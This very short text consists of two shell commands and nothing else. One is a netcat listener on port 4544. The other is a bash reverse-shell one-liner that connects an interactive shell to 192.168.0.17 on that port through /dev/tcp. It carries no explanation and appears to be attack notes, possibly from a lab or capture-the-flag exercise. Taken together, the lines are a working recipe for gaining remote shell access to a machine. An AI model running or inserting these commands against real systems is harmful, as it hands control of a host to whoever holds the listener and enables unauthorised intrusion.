nc -lvp 4544


bash -i >& /dev/tcp/192.168.0.17/4544 0>&1

